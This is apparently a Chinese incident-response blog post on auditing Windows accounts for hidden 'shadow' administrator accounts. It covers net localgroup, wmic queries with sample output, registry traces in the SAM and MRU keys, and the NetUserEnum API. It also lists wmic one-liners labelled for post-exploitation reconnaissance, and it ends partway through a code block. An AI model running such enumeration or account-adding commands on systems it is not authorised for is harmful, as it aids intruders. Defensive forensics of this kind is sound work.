src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620636850767-6f208530-e078-476a-adf0-5a52a6208c65.png" class="" title="image.png"><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620636873626-f07b91c5-7583-4c4a-a1ec-bae971a67266.png" class="" title="image.png"><h3 id="net-localgroup-用户组"><a href="#net-localgroup-用户组" class="headerlink" title="net localgroup 用户组"></a>net localgroup 用户组</h3><p>这里也同样到官方查看相关用法，可以在这里找到：<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11)</a></p><h4 id="命令释义-1"><a href="#命令释义-1" class="headerlink" title="命令释义"></a>命令释义</h4><pre><code>net localgroup [&lt;GroupName&gt; [/comment: &quot;&lt;Text&gt;&quot;]] [/domain]net localgroup [&lt;GroupName&gt; &#123;/add [/comment: &quot;&lt;Text&gt;&quot;] | /delete&#125; [/domain]net localgroup [&lt;GroupName&gt; &lt;Name&gt; […] &#123;/add |  /delete&#125; [/domain]&lt;GroupName&gt;指定要添加、展开或删除的本地组的名称。net localgroup &lt;GroupName&gt;显示本地组中用户或全局组的列表，无需附加参数。/comment: &quot;&lt;Text&gt;&quot;为新组或现有组添加注释。备注最多256个字符。将文本用引号括起来。/domain在当前域的主域控制器上执行该操作。否则，操作将在本地执行。&lt;Name&gt;[ ...]列出要从本地组中添加或删除的一个或多个用户名或组名。/add将全局组名或用户名添加到本地组。在使用此命令将用户或全局组添加到本地组之前，必须先为用户或全局组建立帐户。/delete从本地组中移除组名或用户名。net help &lt;Command&gt;显示指定net命令的帮助。</code></pre><h4 id="常用语句-1"><a href="#常用语句-1" class="headerlink" title="常用语句"></a>常用语句</h4><pre><code>以下示例将名为Exec的本地组添加到本地用户帐户数据库，输入: Net localgroup exec /add . Net以下示例将名为Exec的本地组添加到域用户帐户数据库，输入: Net localgroup exec /add /domain以下示例将现有用户帐户stevev、ralphr(来自Sales域)和jennyt添加到本地计算机上的Exec本地组，输入: Net localgroup exec stevev sales\ralphr jennyt /add以下示例将现有用户帐户stevev、ralphr和jennyt添加到域的Exec组中，输入: Net localgroup exec stevev ralphr jennyt /add /domain以下示例显示Exec本地组中的用户，输入: net localgroup exec以下示例向Exec本地组记录添加注释，输入: net localgroup exec /comment: “行政人员。”</code></pre><h3 id="wmic-useraccount（可审影子账户）"><a href="#wmic-useraccount（可审影子账户）" class="headerlink" title="wmic useraccount（可审影子账户）"></a>wmic useraccount（可审影子账户）</h3><p>wmic 也常被用于后渗透阶段系统快速信息收集，我们仍然先从基本命令入手</p><pre><code>command &lt;/parameter&gt;</code></pre><table><thead><tr><th>子命令</th><th>描述</th></tr></thead><tbody><tr><td>class</td><td>转义WMIC的默认别名模式，以直接访问WMI模式中的类。</td></tr><tr><td>path</td><td>转义WMIC的默认别名模式，以直接访问WMI模式中的实例。</td></tr><tr><td>context</td><td>显示所有全局开关的当前值。</td></tr><tr><td>[quit | exit]</td><td>退出WMIC命令shell。</td></tr></tbody></table><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;/parameter&gt;</code></td><td>&lt;简明描述，以动词&gt;开头</td></tr><tr><td><code>&lt;/param2&gt;  </code></td><td>&lt;另一个简明的描述，以动词&gt;开头</td></tr></tbody></table><pre><code>&gt; wmic /?[全局开关] &lt;命令&gt;可以使用以下全局开关: /NAMESPACE           别名在其上操作的命名空间的路径。/ROLE                包含别名定义的角色的路径。/NODE                别名在其上操作的服务器。/IMPLEVEL            客户端模拟级别。/AUTHLEVEL           客户端身份验证级别。/LOCALE              客户端应使用的语言 ID。/PRIVILEGES          启用或禁用所有权限。/TRACE               将调试信息输出到 stderr。/RECORD              记录所有输入命令和输出内容。/INTERACTIVE         设置或重置交互模式。/FAILFAST            设置或重置 FailFast 模式。/USER                会话期间要使用的用户。/PASSWORD            登录会话时要使用的密码。/OUTPUT              指定输出重定向模式。/APPEND              指定输出重定向模式。/AGGREGATE           设置或重置聚合模式。/AUTHORITY           指定连接的 &lt;授权类型&gt;。/?[: &lt;BRIEF|FULL&gt;]    用法信息。有关特定全局开关的详细信息，请键入:  switch-name /?当前角色中可以使用以下别名: ALIAS                    - 对本地系统上可用别名的访问BASEBOARD                - 基板(也称为主板或系统板)管理。BIOS                     - 基本输入/输出服务(BIOS)管理。BOOTCONFIG               - 启动配置管理。CDROM                    - CD-ROM 管理。COMPUTERSYSTEM           - 计算机系统管理。CPU                      - CPU 管理。CSPRODUCT                - SMBIOS 中的计算机系统产品信息。DATAFILE                 - 数据文件管理。DCOMAPP                  - DCOM 应用程序管理。DESKTOP                  - 用户的桌面管理。DESKTOPMONITOR           - 桌面监视器管理。DEVICEMEMORYADDRESS      - 设备内存地址管理。DISKDRIVE                - 物理磁盘驱动器管理。DISKQUOTA                - 用于 NTFS 卷的磁盘空间使用量。DMACHANNEL               - 直接内存访问(DMA)通道管理。ENVIRONMENT              - 系统环境设置管理。FSDIR                    - 文件系统目录项管理。GROUP                    - 组帐户管理。IDECONTROLLER            - IDE 控制器管理。IRQ                      - 中断请求线路(IRQ)管理。JOB                      - 提供对使用计划服务安排的作业的访问。LOADORDER                - 定义执行依赖关系的系统服务的管理。LOGICALDISK              - 本地存储设备管理。LOGON                    - 登录会话。MEMCACHE                 - 缓存内存管理。MEMORYCHIP               - 内存芯片信息。MEMPHYSICAL              - 计算机系统的物理内存管理。NETCLIENT                - 网络客户端管理。NETLOGIN                 - 网络登录信息(属于特定用户)管理。NETPROTOCOL              - 协议(及其网络特征)管理。NETUSE                   - 活动网络连接管理。NIC                      - 网络接口控制器(NIC)管理。NICCONFIG                - 网络适配器管理。NTDOMAIN                 - NT 域管理。NTEVENT                  - NT 事件日志中的项目。NTEVENTLOG               - NT 事件日志文件管理。ONBOARDDEVICE            - 主板(系统板)中内置的通用适配器设备的管理。OS                       - 已安装操作系统的管理。PAGEFILE                 - 虚拟内存文件交换管理。PAGEFILESET              - 页面文件设置管理。PARTITION                - 物理磁盘的已分区区域的管理。PORT                     - I/O 端口管理。PORTCONNECTOR            - 物理连接端口管理。PRINTER                  - 打印机设备管理。PRINTERCONFIG            - 打印机设备配置管理。PRINTJOB                 - 打印作业管理。PROCESS                  - 进程管理。PRODUCT                  - 安装程序包任务管理。QFE                      - 快速修复工程。QUOTASETTING             - 卷上的磁盘配额设置信息。RDACCOUNT                - 远程桌面连接权限管理。RDNIC                    - 对特定网络适配器的远程桌面连接管理。RDPERMISSIONS            - 特定远程桌面连接的权限。RDTOGGLE                 - 远程打开或关闭远程桌面侦听程序。RECOVEROS                - 操作系统出现故障时将从内存收集的信息。REGISTRY                 - 计算机系统注册表管理。SCSICONTROLLER           - SCSI 控制器管理。SERVER                   - 服务器信息管理。SERVICE                  - 服务应用程序管理。SHADOWCOPY               - 卷影副本管理。SHADOWSTORAGE            - 卷影副本存储区域管理。SHARE                    - 共享资源管理。SOFTWAREELEMENT          - 系统上安装的软件产品元素的管理。SOFTWAREFEATURE          - SoftwareElement 的软件产品子集的管理。SOUNDDEV                 - 声音设备管理。STARTUP                  - 当用户登录到计算机系统时自动运行的命令的管理。SYSACCOUNT               - 系统帐户管理。SYSDRIVER                - 基本服务的系统驱动程序管理。SYSTEMENCLOSURE          - 物理系统外壳管理。SYSTEMSLOT               - 物理连接点(包括端口、插槽和外设以及专用连接点)的管理。TAPEDRIVE                - 磁带驱动器管理。TEMPERATURE              - 温度传感器(电子温度计)数据管理。TIMEZONE                 - 时区数据管理。UPS                      - 不间断电源(UPS)管理。USERACCOUNT              - 用户帐户管理。VOLTAGE                  - 电压传感器(电子电压表)数据管理。VOLUME                   - 本地存储卷管理。VOLUMEQUOTASETTING       - 将磁盘配额设置与特定磁盘卷相关联。VOLUMEUSERQUOTA          - 每用户存储卷配额管理。WMISET                   - WMI 服务操作参数管理。有关特定别名的详细信息，请键入:  alias /?CLASS     - 按 Esc 键可获取完整 WMI 架构。PATH      - 按 Esc 键可获取完整 WMI 对象路径。CONTEXT   - 显示所有全局开关的状态。QUIT/EXIT - 退出程序。有关 CLASS/PATH/CONTEXT 的详细信息，请键入:  (CLASS | PATH | CONTEXT) /?</code></pre><h4 id="常用语句-2"><a href="#常用语句-2" class="headerlink" title="常用语句"></a>常用语句</h4><pre><code>&gt; wmic useraccount- 用户帐户管理（可审影子账户）wmic SYSACCOUNT- 系统帐户管理wmic GROUP- 组帐户管理wmic NETLOGIN - 网络登录信息(属于特定用户)管理wmic VOLUMEUSERQUOTA- 每用户存储卷配额管理。</code></pre><p>如下所示：</p><pre><code>C: \Users\xt&gt;wmic useraccountAccountType  Caption                             Description                                                     Disabled  Domain           FullName  InstallDate  LocalAccount  Lockout  Name                PasswordChangeable  PasswordExpires  PasswordRequired  SID                                             SIDType  Status512          DESKTOP-D9ITQNU\Administrator       管理计算机(域)的内置帐户                                        TRUE      DESKTOP-D9ITQNU                         TRUE          FALSE    Administrator       TRUE                FALSE            TRUE              S-1-5-21-1907407323-3790588764-1508052843-500   1        Degraded512          DESKTOP-D9ITQNU\DefaultAccount      系统管理的用户帐户。                                            TRUE      DESKTOP-D9ITQNU                         TRUE          FALSE    DefaultAccount      TRUE                FALSE            FALSE             S-1-5-21-1907407323-3790588764-1508052843-503   1        Degraded512          DESKTOP-D9ITQNU\Guest               供来宾访问计算机或访问域的内置帐户                              TRUE      DESKTOP-D9ITQNU                         TRUE          FALSE    Guest               FALSE               FALSE            FALSE             S-1-5-21-1907407323-3790588764-1508052843-501   1        Degraded512          DESKTOP-D9ITQNU\WDAGUtilityAccount  系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户。  TRUE      DESKTOP-D9ITQNU                         TRUE          FALSE    WDAGUtilityAccount  TRUE                TRUE             TRUE              S-1-5-21-1907407323-3790588764-1508052843-504   1        Degraded512          DESKTOP-D9ITQNU\xt                                                                                  FALSE     DESKTOP-D9ITQNU                         TRUE          FALSE    xt                  TRUE                TRUE             FALSE             S-1-5-21-1907407323-3790588764-1508052843-1000  1        OKC: \Users\xt&gt;wmic SYSACCOUNTCaption                                        Description                                    Domain           InstallDate  LocalAccount  Name                           SID       SIDType  StatusDESKTOP-D9ITQNU\Everyone                       DESKTOP-D9ITQNU\Everyone                       DESKTOP-D9ITQNU               TRUE          Everyone                       S-1-1-0   5        OKDESKTOP-D9ITQNU\LOCAL                          DESKTOP-D9ITQNU\LOCAL                          DESKTOP-D9ITQNU               TRUE          LOCAL                          S-1-2-0   5        OKDESKTOP-D9ITQNU\CREATOR OWNER                  DESKTOP-D9ITQNU\CREATOR OWNER                  DESKTOP-D9ITQNU               TRUE          CREATOR OWNER                  S-1-3-0   5        OKDESKTOP-D9ITQNU\CREATOR GROUP                  DESKTOP-D9ITQNU\CREATOR GROUP                  DESKTOP-D9ITQNU               TRUE          CREATOR GROUP                  S-1-3-1   5        OKDESKTOP-D9ITQNU\CREATOR OWNER SERVER           DESKTOP-D9ITQNU\CREATOR OWNER SERVER           DESKTOP-D9ITQNU               TRUE          CREATOR OWNER SERVER           S-1-3-2   5        OKDESKTOP-D9ITQNU\CREATOR GROUP SERVER           DESKTOP-D9ITQNU\CREATOR GROUP SERVER           DESKTOP-D9ITQNU               TRUE          CREATOR GROUP SERVER           S-1-3-3   5        OKDESKTOP-D9ITQNU\OWNER RIGHTS                   DESKTOP-D9ITQNU\OWNER RIGHTS                   DESKTOP-D9ITQNU               TRUE          OWNER RIGHTS                   S-1-3-4   5        OKDESKTOP-D9ITQNU\DIALUP                         DESKTOP-D9ITQNU\DIALUP                         DESKTOP-D9ITQNU               TRUE          DIALUP                         S-1-5-1   5        OKDESKTOP-D9ITQNU\NETWORK                        DESKTOP-D9ITQNU\NETWORK                        DESKTOP-D9ITQNU               TRUE          NETWORK                        S-1-5-2   5        OKDESKTOP-D9ITQNU\BATCH                          DESKTOP-D9ITQNU\BATCH                          DESKTOP-D9ITQNU               TRUE          BATCH                          S-1-5-3   5        OKDESKTOP-D9ITQNU\INTERACTIVE                    DESKTOP-D9ITQNU\INTERACTIVE                    DESKTOP-D9ITQNU               TRUE          INTERACTIVE                    S-1-5-4   5        OKDESKTOP-D9ITQNU\SERVICE                        DESKTOP-D9ITQNU\SERVICE                        DESKTOP-D9ITQNU               TRUE          SERVICE                        S-1-5-6   5        OKDESKTOP-D9ITQNU\ANONYMOUS LOGON                DESKTOP-D9ITQNU\ANONYMOUS LOGON                DESKTOP-D9ITQNU               TRUE          ANONYMOUS LOGON                S-1-5-7   5        OKDESKTOP-D9ITQNU\PROXY                          DESKTOP-D9ITQNU\PROXY                          DESKTOP-D9ITQNU               TRUE          PROXY                          S-1-5-8   5        OKDESKTOP-D9ITQNU\SYSTEM                         DESKTOP-D9ITQNU\SYSTEM                         DESKTOP-D9ITQNU               TRUE          SYSTEM                         S-1-5-18  5        OKDESKTOP-D9ITQNU\ENTERPRISE DOMAIN CONTROLLERS  DESKTOP-D9ITQNU\ENTERPRISE DOMAIN CONTROLLERS  DESKTOP-D9ITQNU               TRUE          ENTERPRISE DOMAIN CONTROLLERS  S-1-5-9   5        OKDESKTOP-D9ITQNU\SELF                           DESKTOP-D9ITQNU\SELF                           DESKTOP-D9ITQNU               TRUE          SELF                           S-1-5-10  5        OKDESKTOP-D9ITQNU\Authenticated Users            DESKTOP-D9ITQNU\Authenticated Users            DESKTOP-D9ITQNU               TRUE          Authenticated Users            S-1-5-11  5        OKDESKTOP-D9ITQNU\RESTRICTED                     DESKTOP-D9ITQNU\RESTRICTED                     DESKTOP-D9ITQNU               TRUE          RESTRICTED                     S-1-5-12  5        OKDESKTOP-D9ITQNU\TERMINAL SERVER USER           DESKTOP-D9ITQNU\TERMINAL SERVER USER           DESKTOP-D9ITQNU               TRUE          TERMINAL SERVER USER           S-1-5-13  5        OKDESKTOP-D9ITQNU\REMOTE INTERACTIVE LOGON       DESKTOP-D9ITQNU\REMOTE INTERACTIVE LOGON       DESKTOP-D9ITQNU               TRUE          REMOTE INTERACTIVE LOGON       S-1-5-14  5        OKDESKTOP-D9ITQNU\IUSR                           DESKTOP-D9ITQNU\IUSR                           DESKTOP-D9ITQNU               TRUE          IUSR                           S-1-5-17  5        OKDESKTOP-D9ITQNU\LOCAL SERVICE                  DESKTOP-D9ITQNU\LOCAL SERVICE                  DESKTOP-D9ITQNU               TRUE          LOCAL SERVICE                  S-1-5-19  5        OKDESKTOP-D9ITQNU\NETWORK SERVICE                DESKTOP-D9ITQNU\NETWORK SERVICE                DESKTOP-D9ITQNU               TRUE          NETWORK SERVICE                S-1-5-20  5        OKDESKTOP-D9ITQNU\BUILTIN                        DESKTOP-D9ITQNU\BUILTIN                        DESKTOP-D9ITQNU               TRUE          BUILTIN                        S-1-5-32  3        OKC: \Users\xt&gt;wmic GROUPCaption                                              Description                                                                                                                                Domain           InstallDate  LocalAccount  Name                                 SID           SIDType  StatusDESKTOP-D9ITQNU\Access Control Assistance Operators  此组的成员可以远程查询此计算机上资源的授权属性和权限。                                                                                     DESKTOP-D9ITQNU               TRUE          Access Control Assistance Operators  S-1-5-32-579  4        OKDESKTOP-D9ITQNU\Administrators                       管理员对计算机/域有不受限制的完全访问权                                                                                                    DESKTOP-D9ITQNU               TRUE          Administrators                       S-1-5-32-544  4        OKDESKTOP-D9ITQNU\Backup Operators                     备份操作员为了备份或还原文件可以替代安全限制                                                                                               DESKTOP-D9ITQNU               TRUE          Backup Operators                     S-1-5-32-551  4        OKDESKTOP-D9ITQNU\Cryptographic Operators              授权成员执行加密操作。                                                                                                                     DESKTOP-D9ITQNU               TRUE          Cryptographic Operators              S-1-5-32-569  4        OKDESKTOP-D9ITQNU\Device Owners                        此组的成员可以更改系统范围内的设置。                                                                                                       DESKTOP-D9ITQNU               TRUE          Device Owners                        S-1-5-32-583  4        OKDESKTOP-D9ITQNU\Distributed COM Users                成员允许启动、激活和使用此计算机上的分布式 COM 对象。                                                                                      DESKTOP-D9ITQNU               TRUE          Distributed COM Users                S-1-5-32-562  4        OKDESKTOP-D9ITQNU\Event Log Readers                    此组的成员可以从本地计算机中读取事件日志                                                                                                   DESKTOP-D9ITQNU               TRUE          Event Log Readers                    S-1-5-32-573  4        OKDESKTOP-D9ITQNU\Guests                               按默认值，来宾跟用户组的成员有同等访问权，但来宾帐户的限制更多                                                                             DESKTOP-D9ITQNU               TRUE          Guests                               S-1-5-32-546  4        OKDESKTOP-D9ITQNU\Hyper-V Administrators               此组的成员拥有对 Hyper-V 所有功能的完全且不受限制的访问权限。                                                                              DESKTOP-D9ITQNU               TRUE          Hyper-V Administrators               S-1-5-32-578  4        OKDESKTOP-D9ITQNU\IIS_IUSRS                            Internet 信息服务使用的内置组。                                                                                                            DESKTOP-D9ITQNU               TRUE          IIS_IUSRS                            S-1-5-32-568  4        OKDESKTOP-D9ITQNU\Network Configuration Operators      此组中的成员有部分管理权限来管理网络功能的配置                                                                                             DESKTOP-D9ITQNU               TRUE          Network Configuration Operators      S-1-5-32-556  4        OKDESKTOP-D9ITQNU\Performance Log Users                该组中的成员可以计划进行性能计数器日志记录、启用跟踪记录提供程序，以及在本地或通过远程访问此计算机来收集事件跟踪记录                       DESKTOP-D9ITQNU               TRUE          Performance Log Users                S-1-5-32-559  4        OKDESKTOP-D9ITQNU\Performance Monitor Users            此组的成员可以从本地和远程访问性能计数器数据                                                                                               DESKTOP-D9ITQNU               TRUE          Performance Monitor Users            S-1-5-32-558  4        OKDESKTOP-D9ITQNU\Power Users                          包括高级用户以向下兼容，高级用户拥有有限的管理权限                                                                                         DESKTOP-D9ITQNU               TRUE          Power Users                          S-1-5-32-547  4        OKDESKTOP-D9ITQNU\Remote Desktop Users                 此组中的成员被授予远程登录的权限                                                                                                           DESKTOP-D9ITQNU               TRUE          Remote Desktop Users                 S-1-5-32-555  4        OKDESKTOP-D9ITQNU\Remote Management Users              此组的成员可以通过管理协议(例如，通过 Windows 远程管理服务实现的 WS-Management)访问 WMI 资源。这仅适用于授予用户访问权限的 WMI 命名空间。  DESKTOP-D9ITQNU               TRUE          Remote Management Users              S-1-5-32-580  4        OKDESKTOP-D9ITQNU\Replicator                           支持域中的文件复制                                                                                                                         DESKTOP-D9ITQNU               TRUE          Replicator                           S-1-5-32-552  4        OKDESKTOP-D9ITQNU\System Managed Accounts Group        此组的成员由系统管理。                                                                                                                     DESKTOP-D9ITQNU               TRUE          System Managed Accounts Group        S-1-5-32-581  4        OKDESKTOP-D9ITQNU\Users                                防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序                                                                         DESKTOP-D9ITQNU               TRUE          Users                                S-1-5-32-545  4        OKC: \Users\xt&gt;wmic NETLOGINAccountExpires  AuthorizationFlags  BadPasswordCount  Caption                       CodePage  Comment  CountryCode  Description                                                         Flags  FullName  HomeDirectory  HomeDirectoryDrive  LastLogoff                 LastLogon                  LogonHours                                                                                                                                        LogonServer  MaximumStorage  Name                          NumberOfLogons  Parameters  PasswordAge                PasswordExpires  PrimaryGroupId  Privileges  Profile  ScriptPath  SettingID  UnitsPerWeek  UserComment  UserId  UserType        Workstations                                                      NT AUTHORITY\SYSTEM                                           Network login profile settings for SYSTEM on NT AUTHORITY                                                                                                                                                                                                                                                                                                    NT AUTHORITY\SYSTEM                                                                                                     NT AUTHORITY\LOCAL SERVICE                                    Network login profile settings for LOCAL SERVICE on NT AUTHORITY                                                                                                                                                                                                                                                                                             NT AUTHORITY\LOCAL SERVICE                                                                                              NT AUTHORITY\NETWORK SERVICE                                  Network login profile settings for NETWORK SERVICE on NT AUTHORITY                                                                                                                                                                                                                                                                                           NT AUTHORITY\NETWORK SERVICE                                                      0                   0                 xt                            936                86           Network login profile settings for  on DESKTOP-D9ITQNU              545                                                 **************.******+***  20210425165804.000000+480  Sunday:  No Limit -- Monday:  No Limit -- Tuesday:  No Limit -- Wednesday:  No Limit -- Thursday:  No Limit -- Friday:  No Limit -- Saturday:  No Limit  \\*          4294967295      DESKTOP-D9ITQNU\xt            35                          00000324025454.000000: 000                   513             2                                           168                        1000    Normal AccountC: \Users\xt&gt;wmic VOLUMEUSERQUOTAAccount                                                       DiskSpaceUsed  Limit                 Status  Volume                                                                     WarningLimitWin32_Account.Domain=&quot;DESKTOP-D9ITQNU&quot;,Name=&quot;Administrators&quot;  0              18446744073709551615  0       Win32_Volume.DeviceID=&quot;\\?\Volume&#123;04c048df-758d-4776-9cd8-84ab287e5ec5&#125;\&quot;  18446744073709551615Win32_Account.Domain=&quot;DESKTOP-D9ITQNU&quot;,Name=&quot;Administrators&quot;  0              18446744073709551615  0       Win32_Volume.DeviceID=&quot;\\?\Volume&#123;5ee0bcd2-e04a-4324-afc6-29f338e1551e&#125;\&quot;  18446744073709551615</code></pre><h4 id="渗透常用查询语句"><a href="#渗透常用查询语句" class="headerlink" title="渗透常用查询语句"></a>渗透常用查询语句</h4><p>后渗透中常用一句话查询</p><pre><code>wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format: list获取系统角色、用户名和制造商wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status账户名、域名、本地组成员状态、SID以及相应的状态C: \Users\xt&gt;wmic group get Caption, InstallDate, LocalAccount, Domain, SID, StatusCaption                                              Domain           InstallDate  LocalAccount  SID           StatusDESKTOP-D9ITQNU\Access Control Assistance Operators  DESKTOP-D9ITQNU               TRUE          S-1-5-32-579  OKDESKTOP-D9ITQNU\Administrators                       DESKTOP-D9ITQNU               TRUE          S-1-5-32-544  OKDESKTOP-D9ITQNU\Backup Operators                     DESKTOP-D9ITQNU               TRUE          S-1-5-32-551  OKDESKTOP-D9ITQNU\Cryptographic Operators              DESKTOP-D9ITQNU               TRUE          S-1-5-32-569  OKDESKTOP-D9ITQNU\Device Owners                        DESKTOP-D9ITQNU               TRUE          S-1-5-32-583  OKDESKTOP-D9ITQNU\Distributed COM Users                DESKTOP-D9ITQNU               TRUE          S-1-5-32-562  OKDESKTOP-D9ITQNU\Event Log Readers                    DESKTOP-D9ITQNU               TRUE          S-1-5-32-573  OKDESKTOP-D9ITQNU\Guests                               DESKTOP-D9ITQNU               TRUE          S-1-5-32-546  OKDESKTOP-D9ITQNU\Hyper-V Administrators               DESKTOP-D9ITQNU               TRUE          S-1-5-32-578  OKDESKTOP-D9ITQNU\IIS_IUSRS                            DESKTOP-D9ITQNU               TRUE          S-1-5-32-568  OKDESKTOP-D9ITQNU\Network Configuration Operators      DESKTOP-D9ITQNU               TRUE          S-1-5-32-556  OKDESKTOP-D9ITQNU\Performance Log Users                DESKTOP-D9ITQNU               TRUE          S-1-5-32-559  OKDESKTOP-D9ITQNU\Performance Monitor Users            DESKTOP-D9ITQNU               TRUE          S-1-5-32-558  OKDESKTOP-D9ITQNU\Power Users                          DESKTOP-D9ITQNU               TRUE          S-1-5-32-547  OKDESKTOP-D9ITQNU\Remote Desktop Users                 DESKTOP-D9ITQNU               TRUE          S-1-5-32-555  OKDESKTOP-D9ITQNU\Remote Management Users              DESKTOP-D9ITQNU               TRUE          S-1-5-32-580  OKDESKTOP-D9ITQNU\Replicator                           DESKTOP-D9ITQNU               TRUE          S-1-5-32-552  OKDESKTOP-D9ITQNU\System Managed Accounts Group        DESKTOP-D9ITQNU               TRUE          S-1-5-32-581  OKDESKTOP-D9ITQNU\Users                                DESKTOP-D9ITQNU               TRUE          S-1-5-32-545  OK</code></pre><h3 id="注册表（可审影子账户）"><a href="#注册表（可审影子账户）" class="headerlink" title="注册表（可审影子账户）"></a>注册表（可审影子账户）</h3><p>点击“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620963214068-aaedf282-45ec-48b9-ad35-ff31e9245e17.png" class="" title="image.png"><p>这里为了搜索注册表中所有关于我们影子账户的信息，还可以通过这个软件regscanner</p><p><a href="https://www.nirsoft.net/utils/regscanner.html">https://www.nirsoft.net/utils/regscanner.html</a></p><p>借助工具我们可以针对影子账户关键字，反查所有注册表中的关键字、键值中的值中是否包含影子账户关键字Administrat0r$，这里我门看到一共查处了8项包含有该关键字的注册表这里一次分析总结</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620973733420-05e03a74-419f-4f77-8992-df6fb0a69213.png" class="" title="image.png"><ul><li>计算机文件操作记录</li></ul><pre><code>计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\reg</code></pre><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620973793153-85f35c9f-fc59-4d69-84a1-c8e6917b5c0f.png" class="" title="image.png"><p>文件操作记录中包含有关键字，可以看到.reg，大致可以判断是我们之前保存在桌面上的导出的注册表命名的。通过文件操作记录查看工具针对此注册表可以清晰的看出，这里的确展示的是保存在桌面的注册表导出文件。一共四项与上面4项对应。</p><p>工具可以在这里下载：<a href="https://www.nirsoft.net/utils/open_save_files_view.html">https://www.nirsoft.net/utils/open_save_files_view.html</a></p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620974332921-503b232f-8c9e-4e94-8588-2f6836b5daa4.png" class="" title="image.png"><ul><li>桌面缓存</li></ul><pre><code>计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags\1\Desktop</code></pre><p>桌面所有图标名称等情况，这里也包含的是reg导出文件包含的影子关键字</p><img src="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/1620974710952-2601cf1e-c1af-4aab-97c0-a761b4f9441c.png" class="" title="image.png"><h3 id="NetUserEnum-win32API函数（可审影子账户）"><a href="#NetUserEnum-win32API函数（可审影子账户）" class="headerlink" title="NetUserEnum win32API函数（可审影子账户）"></a>NetUserEnum win32API函数（可审影子账户）</h3><p>这里还是通过官方理解函数，地址如下：<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuserenum">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuserenum</a></p><p>NetUserEnum功能检索服务器上所有用户帐户的信息。这里可以用于检查系统账户信息。</p><pre><code>NET_API_STATUS 